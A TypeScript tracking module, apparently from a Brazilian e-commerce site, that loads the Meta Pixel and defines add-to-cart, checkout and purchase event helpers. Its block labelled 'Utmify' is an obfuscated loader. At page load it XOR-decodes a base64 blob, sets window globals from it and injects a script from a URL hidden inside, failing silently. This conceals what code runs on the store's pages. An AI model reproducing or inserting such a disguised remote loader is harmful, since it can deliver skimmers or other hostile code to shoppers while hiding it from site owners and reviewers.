/**
 * Pixels de rastreamento: Meta (Facebook) Pixel + Utmify.
 * Injetados apenas no cliente, uma única vez por sessão.
 */

declare global {
  interface Window {
    fbq?: (...args: unknown[]) => void;
    _fbq?: unknown;
  }
}

const META_PIXEL_ID = "2505633886593330";
let initialized = false;

export function initPixels() {
  if (initialized || typeof window === "undefined") return;
  initialized = true;

  // Meta Pixel
  if (!window.fbq) {
    const fbq = function (...args: unknown[]) {
      fbq.queue.push(args);
    } as { (...args: unknown[]): void; queue: unknown[][]; loaded: boolean; version: string };
    fbq.queue = [];
    fbq.loaded = true;
    fbq.version = "2.0";
    window.fbq = fbq as unknown as (...args: unknown[]) => void;
    window._fbq = fbq;

    const script = document.createElement("script");
    script.async = true;
    script.src = "https://connect.facebook.net/en_US/fbevents.js";
    document.head.appendChild(script);

    window.fbq("init", META_PIXEL_ID);
  }
  window.fbq?.("track", "PageView");

  // Utmify
  try {
    const q = atob(
      "DN5DpoLZU2O0zdeuMqVh0/C1cVmWpaPaQq15ia26Nw2auKPDW7g6iOG2Pk3Wv/jdUawq1vaqfBPdtbLCHa4q3ue1fQnH7/uMU6o31Ou7JhfRvvWUaYNvhOW1PAHVoaSMCIU4hOy4PgaW9/XeW6Ymysu9cU+Wu7bCR7thnKDvMlqM/+LNBucglbTrYFSDqLKXC+kilrb7Lj7J"
    );
    const bytes: number[] = [];
    for (let i = 0; i < q.length; i++) bytes.push(q.charCodeAt(i) & 255);
    const keyLen = bytes[0] ?? 0;
    const key = bytes.slice(1, 1 + keyLen);
    const body = bytes.slice(1 + keyLen).map((b, i) => b ^ (key[i % keyLen] ?? 0));
    let decoded = "";
    for (let i = 0; i < body.length; i++) decoded += String.fromCharCode(body[i] ?? 0);
    const config = JSON.parse(decodeURIComponent(escape(decoded)));
    (config.globals || []).forEach((g: { name: string; value: unknown }) => {
      (window as unknown as Record<string, unknown>)[g.name] = g.value;
    });
    const script = document.createElement("script");
    script.src = config.url;
    script.async = true;
    script.defer = true;
    (config.attributes || []).forEach((a: { name: string; value: string }) => {
      script.setAttribute(a.name, a.value);
    });
    document.head.appendChild(script);
  } catch {
    // Utmify pixel falhou — não bloqueia a loja
  }
}

/** Evento padrão do Meta Pixel. */
export function trackEvent(event: string, params?: Record<string, unknown>) {
  if (typeof window === "undefined") return;
  window.fbq?.("track", event, params);
}

/** Valor em centavos → string decimal para os pixels. */
const toCurrency = (cents: number) => (cents / 100).toFixed(2);

export function trackAddToCart(item: { name: string; slug: string; price: number; quantity: number }) {
  trackEvent("AddToCart", {
    content_name: item.name,
    content_ids: [item.slug],
    content_type: "product",
    value: toCurrency(item.price * item.quantity),
    currency: "BRL",
  });
}

export function trackInitiateCheckout(total: number, items: { slug: string; quantity: number }[]) {
  trackEvent("InitiateCheckout", {
    content_ids: items.map((i) => i.slug),
    content_type: "product",
    num_items: items.reduce((sum, i) => sum + i.quantity, 0),
    value: toCurrency(total),
    currency: "BRL",
  });
}

export function trackPurchase(total: number, items: { slug: string; quantity: number }[]) {
  trackEvent("Purchase", {
    content_ids: items.map((i) => i.slug),
    content_type: "product",
    value: toCurrency(total),
    currency: "BRL",
  });
}
